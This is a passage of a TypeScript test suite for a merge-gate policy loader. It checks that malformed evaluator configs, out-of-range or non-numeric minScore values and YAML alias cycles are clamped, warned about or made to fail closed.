    expect(sandboxEntry(stringy)).not.toHaveProperty("allowInstallScripts");
  });

  it("clamps webhook.timeoutMs, the same defect one array element over", async () => {
    const policy = await loadConfig({
      evaluators: [{ type: "webhook", url: "https://example.com/e", timeoutMs: 999_999_999 }],
    });

    // Narrowed rather than cast to a bag of unknowns: the entry has a named type
    // now (#336), so the assertions below check the real fields.
    const webhook = policy.evaluators.find((e) => e.type === "webhook");
    if (webhook?.type !== "webhook") throw new Error("policy dropped the webhook entry");
    expect(webhook.timeoutMs).toBe(MAX_PHASE_TIMEOUT_MS);
    expect(webhook.url).toBe("https://example.com/e");
  });

  it("clamps minScore into [0, 1] so the gate cannot be disabled by a number", async () => {
    const low = await loadConfig({ evaluators: [{ type: "diff" }], minScore: -5 });
    expect(low.minScore).toBe(0);

    const high = await loadConfig({ evaluators: [{ type: "diff" }], minScore: 42 });
    expect(high.minScore).toBe(1);
  });

  it("does not crash buildEvaluators on entries that are not objects", async () => {
    // The array guard only checks Array.isArray, so these used to reach the
    // evaluator builders and throw on `.type` access. They are now rejected,
    // and because entries were dropped the gate fails closed.
    const policy = await loadConfig({
      evaluators: [null, "sandbox", {}, 42, [], { type: "diff", maxLines: 10 }],
    });

    expect(policy.configError).toBeDefined();
    // Evaluation still runs on the defaults so the change flow is not broken.
    expect(policy.evaluators).toEqual([{ type: "diff" }]);
  });

  it("fails closed when one entry is dropped but its siblings survive", async () => {
    // The fail-open shape this guards: a typo'd webhook url used to reach
    // WebhookEvaluator and block the merge. Dropping the entry while `diff`
    // survives would silently remove that gate and let the change through on
    // the remaining one.
    const policy = await loadConfig({
      evaluators: [{ type: "webhook" }, { type: "diff" }],
    });

    expect(policy.configError).toBeDefined();
    expect(policy.configError).toMatch(/unusable/i);
  });

  it("does not fail closed for an unrecognized evaluator type", async () => {
    // A policy naming a future or misspelled evaluator type is copied through
    // and rejected downstream by buildEvaluators, so it must not trip the
    // dropped-entry check.
    const policy = await loadConfig({
      evaluators: [{ type: "future_evaluator" }, { type: "diff" }],
    });

    expect(policy.configError).toBeUndefined();
    expect(policy.evaluators).toHaveLength(2);
  });

  it("preserves evaluator types it does not clamp", async () => {
    const policy = await loadConfig({
      evaluators: [{ type: "llm", model: "m", threshold: 0.5 }],
    });

    expect(policy.evaluators[0]).toMatchObject({ type: "llm", model: "m", threshold: 0.5 });
  });

  it("never mutates the module-level default policy", async () => {
    // The loader shallow-spreads DEFAULT_POLICY, so a sanitizer that clamped in
    // place would poison the default for the isolate's lifetime — across
    // requests and across tenants.
    await loadConfig({ evaluators: [{ type: "sandbox", timeoutMs: 999_999_999 }] });

    mockReadFileFromRepo.mockResolvedValue({
      success: false,
      error: new AppError("missing", "NOT_FOUND", 404),
    });
    const fallback = await loadPolicy("https://repo.example.com", "tok", mockLogger);

    expect(fallback.evaluators).toEqual([{ type: "diff" }]);
  });

  /** Loads a literal YAML document, for values JSON cannot express. */
  async function loadYaml(yaml: string): Promise<EvalPolicy> {
    mockReadFileFromRepo.mockResolvedValue({ success: true, data: yaml });
    return loadPolicy("https://repo.example.com", "tok", mockLogger);
  }

  it("replaces a minScore it rejected instead of leaving the raw value in place", async () => {
    // The spread puts the raw value in `policy.minScore` before validation, so
    // a rejection that only skips the assignment leaves the bad value behind.
    // `-Infinity` makes `score >= minScore` true for every score — including a
    // sandbox verdict of 0 — which disables the gate entirely.
    const negInfinity = await loadYaml(
      ["evaluators:", "  - type: diff", "minScore: -.inf"].join("\n"),
    );
    expect(negInfinity.minScore).toBe(0.7);

    const nan = await loadYaml(["evaluators:", "  - type: diff", "minScore: .nan"].join("\n"));
    expect(nan.minScore).toBe(0.7);

    // A string compares by coercion: `0.1 >= "-5"` is true.
    const stringy = await loadConfig({ evaluators: [{ type: "diff" }], minScore: "-5" });
    expect(stringy.minScore).toBe(0.7);
  });

  it("fails closed, not open, when a YAML alias cycle appears in a policy", async () => {
    // A circular structure throws inside JSON.stringify, which is reached while
    // *logging* a rejected entry. That throw used to escape to the outer
    // handler, which treats a file as absent — so a policy declaring two
    // required approvals silently became the permissive default with **no**
    // configError, dropping the approval requirement and re-enabling
    // force-merge. Logging must never decide whether a policy loads.
    //
    // The file is still malformed (the self-referencing entry is unusable), so
    // the outcome is a blocked merge rather than a loaded policy — which is the
    // safe direction, and the opposite of what it used to do.
    const policy = await loadYaml(
      [
        "merge:",
        "  requiredApprovals: 2",
        "  allowForce: false",
        "evaluators: &e",
        "  - type: sandbox",
        "  - *e",
      ].join("\n"),
    );

    expect(policy.configError).toBeDefined();
  });

  it("fails closed when a policy names evaluators but none survive sanitization", async () => {
    // Falling through with an empty array would leave only the always-on secret
    // scan, which passes a clean diff — so a policy the author meant as a gate
    // would accept the change.
    const policy = await loadConfig({ evaluators: [null, "sandbox", 42] });

    expect(policy.configError).toBeDefined();
  });

  it("drops a webhook entry with no url", async () => {
    const policy = await loadConfig({ evaluators: [{ type: "webhook" }] });

    // Dropped, and therefore failing closed rather than loading a gate-less
    // policy.
    expect(policy.configError).toBeDefined();
  });

  it("does not fail closed for a genuinely empty evaluators array", async () => {
    // Distinct from the case above: the author declared no evaluators, which
    // already behaved this way and is not a misunderstanding of the file.
    const policy = await loadConfig({ evaluators: [] });

    expect(policy.configError).toBeUndefined();
  });

  it("keeps a webhook's url and secret while clamping its timeout", async () => {
    const policy = await loadConfig({
      evaluators: [
        { type: "webhook", url: "https://e.example/x", secret: "s", timeoutMs: 999_999_999 },
      ],
    });

    expect(policy.evaluators[0]).toEqual({
      type: "webhook",
      url: "https://e.example/x",
      secret: "s",
      timeoutMs: MAX_PHASE_TIMEOUT_MS,
    });
  });

  it("warns about an unrecognized sandbox field instead of dropping it silently", async () => {
    // `timeout` for `timeoutMs` is the typo most likely to be made and least
    // likely to be noticed, since the whitelist rebuild discards it.
    const warn = vi.mocked(mockLogger.warn);
    warn.mockClear();

    await loadConfig({ evaluators: [{ type: "sandbox", timeout: 60_000 }] });

    expect(warn).toHaveBeenCalledWith(
      "Ignoring unrecognized sandbox evaluator field",
      expect.objectContaining({ field: "timeout" }),
    );
  });

  it("returns an evaluators array that does not alias the parsed input", async () => {
    const policy = await loadConfig({
      evaluators: [{ type: "sandbox", timeoutMs: 999_999_999 }],
    });
    const second = await loadConfig({ evaluators: [{ type: "diff" }] });

    expect(policy.evaluators).not.toBe(second.evaluators);
  });
});
